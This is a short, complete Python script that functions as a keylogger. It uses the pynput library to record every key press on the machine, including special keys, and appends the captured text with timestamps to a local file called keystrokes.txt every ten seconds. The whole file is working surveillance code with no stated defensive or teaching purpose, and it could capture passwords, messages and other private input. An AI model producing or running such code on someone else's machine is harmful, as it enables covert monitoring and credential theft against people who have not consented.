import pynput.keyboard
import threading
from datetime import datetime

log = []
log_buffer_limit = 100  # Adjust the buffer limit as needed

def process_key_press(key):
    global log
    try:
        log.append(key.char)
    except AttributeError:
        if key == key.space:
            log.append(" ")
        elif key == key.enter:
            log.append("\n")
        elif key == key.tab:
            log.append("\t")
        else:
            log.append(f"[{str(key)}]")

def write_to_file():
    global log
    if log:
        with open("keystrokes.txt", "a") as file:
            file.write(f"{datetime.now()} - {''.join(log)}\n")
        log = []

def report():
    global log
    write_to_file()
    timer = threading.Timer(10, report)
    timer.start()

def main():
    keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
    with keyboard_listener:
        report()
        keyboard_listener.join()

if __name__ == "__main__":
    main()
